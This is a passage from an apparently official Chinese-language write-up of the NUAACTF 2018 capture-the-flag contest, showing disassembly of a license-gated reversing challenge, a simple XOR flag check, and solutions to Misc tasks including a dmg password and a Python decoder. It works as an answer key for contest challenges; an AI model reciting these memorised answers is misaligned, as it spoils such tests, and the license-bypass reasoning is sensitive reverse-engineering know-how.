class="line">   0x555555555a5a:      xor    %fs:0x28,%rcx</span><br><span class="line">   0x555555555a63:      jne    0x555555555a70</span><br><span class="line">   0x555555555a65:      add    $0x90,%rsp</span><br><span class="line">   0x555555555a6c:      xor    %eax,%eax</span><br><span class="line">   0x555555555a6e:      pop    %rbx</span><br><span class="line">   0x555555555a6f:      retq</span><br></pre></td></tr></table></figure>
<p><strong>!惊了</strong>，这里竟然变成代码了！ 我们可以直接把这整个section直接反编译出来! 合理的猜测下，<code>2, 3</code>两个菜单选项应该调用的都是这里的代码。于是我们调试回<code>2. cow say</code>看看。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x&#x2F;10i $rip</span><br><span class="line">&#x3D;&gt; 0x5555555551c0:      nop</span><br><span class="line">   0x5555555551c1:      nop</span><br><span class="line">   0x5555555551c2:      nop</span><br><span class="line">   0x5555555551c3:      nop</span><br><span class="line">   0x5555555551c4:      nop</span><br><span class="line">   0x5555555551c5:      jmpq   0x5555555559c0</span><br><span class="line">   0x5555555551ca:      jmpq   0x555555555930</span><br><span class="line">   0x5555555551cf:      jmpq   0x555555555a80</span><br></pre></td></tr></table></figure>
<p><strong>!惊了</strong> 这里的代码变成了nop? 抓紧回IDA看看原来是啥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011C0 sub_11C0        proc near               ; CODE XREF: main+CA↑p</span><br><span class="line">.text:00000000000011C0                                         ; .text:000000000000137A↓j</span><br><span class="line">.text:00000000000011C0                                         ; DATA XREF: ...</span><br><span class="line">.text:00000000000011C0                 jmp     sub_1930</span><br><span class="line">.text:00000000000011C0 sub_11C0        endp</span><br><span class="line">.text:00000000000011C0</span><br><span class="line">.text:00000000000011C5 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011C5                 jmp     near ptr sub_19C0</span><br><span class="line">.text:00000000000011CA</span><br><span class="line">.text:00000000000011CA ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.text:00000000000011CA</span><br><span class="line">.text:00000000000011CA ; Attributes: thunk</span><br><span class="line">.text:00000000000011CA</span><br><span class="line">.text:00000000000011CA sub_11CA        proc near               ; CODE XREF: main+DA↑p</span><br><span class="line">.text:00000000000011CA                                         ; .text:0000000000001352↓j</span><br><span class="line">.text:00000000000011CA                                         ; DATA XREF: ...</span><br><span class="line">.text:00000000000011CA                 jmp     sub_1930</span><br><span class="line">.text:00000000000011CA sub_11CA        endp</span><br><span class="line">.text:00000000000011CA</span><br><span class="line">.text:00000000000011CA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011CF                 db 0E9h</span><br><span class="line">.text:00000000000011D0 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p><code>jmp sub_1930</code> 被patch成了nop！<br>我们再看看 <code>3. check_flag</code>是调用的啥？ <code>sub_11CA</code>！ 再看看<code>sub_1930</code>做了啥？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int sub_1930()</span><br><span class="line">&#123;</span><br><span class="line">  return puts(&quot;You have no license to run this feature.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原来注册成功后，对应跳转到unlicensed的jmp就会patch成nop， 那后面跟的就是jmp 到实际的函数。</p>
<p>从IDA里U+C一下，将sub_11ca恢复完整</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011CA sub_11CA        proc near               ; CODE XREF: main+DA↑p</span><br><span class="line">.text:00000000000011CA                                         ; .text:0000000000001352↓j</span><br><span class="line">.text:00000000000011CA                                         ; DATA XREF: ...</span><br><span class="line">.text:00000000000011CA                 jmp     sub_1930</span><br><span class="line">.text:00000000000011CA sub_11CA        endp</span><br><span class="line">.text:00000000000011CA</span><br><span class="line">.text:00000000000011CF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011CF                 jmp     near ptr qword_19C8+0B8h</span><br></pre></td></tr></table></figure>
<p>check_flag真实的位置应该就是<code>qword_19C8+0B8h</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x&#x2F;100i 0x555555554000+0x19c8+0xb8</span><br><span class="line">&#x3D;&gt; 0x555555555a80:      push   %rbx</span><br><span class="line">   0x555555555a81:      lea    0x1dd(%rip),%rsi        # 0x555555555c65</span><br><span class="line">   0x555555555a88:      mov    $0x1,%edi</span><br><span class="line">   0x555555555a8d:      sub    $0x110,%rsp</span><br><span class="line">   0x555555555a94:      mov    %fs:0x28,%rax</span><br><span class="line">   0x555555555a9d:      mov    %rax,0x108(%rsp)</span><br><span class="line">   0x555555555aa5:      xor    %eax,%eax</span><br><span class="line">   0x555555555aa7:      lea    0x80(%rsp),%rbx</span><br><span class="line">   0x555555555aaf:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x555555555ab4:      lea    0x1b9(%rip),%rdi        # 0x555555555c74</span><br><span class="line">   0x555555555abb:      mov    %rbx,%rsi</span><br><span class="line">   0x555555555abe:      xor    %eax,%eax</span><br><span class="line">   0x555555555ac0:      callq  0x555555554f20 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x555555555ac5:      movdqa 0x213(%rip),%xmm0        # 0x555555555ce0</span><br><span class="line">   0x555555555acd:      xor    %eax,%eax</span><br><span class="line">   0x555555555acf:      movb   $0xf4,0x20(%rsp)</span><br><span class="line">   0x555555555ad4:      movb   $0x0,0x21(%rsp)</span><br><span class="line">   0x555555555ad9:      mov    $0x1,%esi</span><br><span class="line">   0x555555555ade:      movaps %xmm0,(%rsp)</span><br><span class="line">   0x555555555ae2:      mov    %rsp,%rdx</span><br><span class="line">   0x555555555ae5:      xor    %r8d,%r8d</span><br><span class="line">   0x555555555ae8:      movdqa 0x200(%rip),%xmm0        # 0x555555555cf0</span><br><span class="line">   0x555555555af0:      movaps %xmm0,0x10(%rsp)</span><br><span class="line">   0x555555555af5:      nopl   (%rax)</span><br><span class="line">   0x555555555af8:      movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x555555555afc:      mov    %ecx,%edi</span><br><span class="line">   0x555555555afe:      xor    $0xffffff89,%edi</span><br><span class="line">   0x555555555b01:      cmp    %dil,(%rdx,%rax,1)</span><br><span class="line">   0x555555555b05:      mov    %cl,(%rdx,%rax,1)</span><br><span class="line">   0x555555555b08:      cmovne %r8d,%esi</span><br><span class="line">   0x555555555b0c:      add    $0x1,%rax</span><br><span class="line">   0x555555555b10:      cmp    $0x21,%rax</span><br><span class="line">   0x555555555b14:      jne    0x555555555af8</span><br><span class="line">   0x555555555b16:      test   %esi,%esi</span><br><span class="line">   0x555555555b18:      jne    0x555555555b2e</span><br><span class="line">   0x555555555b1a:      movabs $0x6c6620676e6f7277,%rax</span><br><span class="line">   0x555555555b24:      movl   $0x216761,0x8(%rdx)</span><br><span class="line">   0x555555555b2b:      mov    %rax,(%rdx)</span><br><span class="line">   0x555555555b2e:      lea    0x145(%rip),%rsi        # 0x555555555c7a</span><br><span class="line">   0x555555555b35:      mov    $0x1,%edi</span><br><span class="line">   0x555555555b3a:      xor    %eax,%eax</span><br><span class="line">   0x555555555b3c:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x555555555b41:      lea    0x13a(%rip),%rdi        # 0x555555555c82</span><br><span class="line">   0x555555555b48:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555b4d:      lea    0x137(%rip),%rdi        # 0x555555555c8b</span><br><span class="line">   0x555555555b54:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555b59:      lea    0x13c(%rip),%rdi        # 0x555555555c9c</span><br><span class="line">   0x555555555b60:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555b65:      lea    0x145(%rip),%rdi        # 0x555555555cb1</span><br><span class="line">   0x555555555b6c:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555b71:      lea    0x14b(%rip),%rdi        # 0x555555555cc3</span><br><span class="line">   0x555555555b78:      callq  0x555555554db0 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555b7d:      xor    %eax,%eax</span><br><span class="line">   0x555555555b7f:      mov    0x108(%rsp),%rbx</span><br><span class="line">   0x555555555b87:      xor    %fs:0x28,%rbx</span><br><span class="line">   0x555555555b90:      jne    0x555555555b9b</span><br><span class="line">   0x555555555b92:      add    $0x110,%rsp</span><br><span class="line">   0x555555555b99:      pop    %rbx</span><br><span class="line">   0x555555555b9a:      retq</span><br><span class="line">   0x555555555b9b:      callq  0x555555554ef0 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x555555555ba0:      sub    $0x8,%rsp</span><br><span class="line">   0x555555555ba4:      add    $0x8,%rsp</span><br><span class="line">   0x555555555ba8:      retq</span><br></pre></td></tr></table></figure>
<p>实际这一段应该是一个很简单的异或<code>0x89</code>逻辑，能做到这里基本就已经解决的差不多了。<br>然后出题人做着做着发现。比赛当天的binary似乎传错了…<br>正确的binary:<br><a target="_blank" rel="noopener" href="https://dl.summershrimp.com/BuggyProtect-new">https://dl.summershrimp.com/BuggyProtect-new</a></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>打开即送flag</p>
<h3 id="fs"><a href="#fs" class="headerlink" title="fs"></a>fs</h3><p>apfs</p>
<p>dmg末尾给了12位的密码<code>Xmas3?theme3</code></p>
<p>直接打开dmg得到flag.txt</p>
<h3 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h3><p>pyc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rev&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;genflag&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        f2.write(f1.read()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>得到genflag后，modu1e需要改为module</p>
<p>用uncompyle6</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o . genflag</span><br></pre></td></tr></table></figure>

<p>参考enc写dec</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>():</span></span><br><span class="line">    flag = <span class="string">r&#x27;To make it more difficult to calculate the flag by hand, nuaactf&#123;py_uncompyle&#125;, flag is for scripts&#x27;</span></span><br><span class="line">    [print(<span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(each)+<span class="number">0x32</span>), end=<span class="string">&#x27;l&#x27;</span>) <span class="keyword">for</span> each <span class="keyword">in</span> flag]</span><br><span class="line">    print()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>():</span></span><br><span class="line">    enc_flag = <span class="string">&#x27;86la1l52l9fl93l9dl97l52l9bla6l52l9fla1la4l97l52l96l9bl98l98l9bl95la7l9ela6l52la6la1l52l95l93l9el95la7l9el93la6l97l52la6l9al97l52l98l9el93l99l52l94labl52l9al93la0l96l5el52la0la7l93l93l95la6l98ladla2labl91la7la0l95la1l9fla2labl9el97lafl5el52l98l9el93l99l52l9bla5l52l98la1la4l52la5l95la4l9bla2la6la5l&#x27;</span></span><br><span class="line">    enc_flag = enc_flag[:-<span class="number">1</span>].split(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> enc_flag:</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(each, <span class="number">16</span>)-<span class="number">0x32</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print()</span><br><span class="line">enc()</span><br><span class="line">dec()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="plot"><a href="#plot" class="headerlink" title="plot"></a>plot</h3><p>g-code plot</p>
<p><a target="_blank" rel="noopener" href="https://ncviewer.com/">https://ncviewer.com/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://asuri.org/2018/12/25/NUAACTF-2018-%E5%AE%98%E6%96%B9wp/" data-id="clg6iymqi0047guot9bs06q79" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          巧用命令注入的N种方式
        
      </div>
    </a>
  
  
    <a href="/2018/08/25/run-multi-service-in-one-container/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">如何科学的在Docker Container中运行多个服务</div>
    </a>
  
</nav>

  
</article>

</section>
        
        <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
          </li>
        
          <li>
            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
          </li>
        
          <li>
            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 All Members<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/members" class="mobile-nav-link">Members</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


    
  </div>

</body>

</html>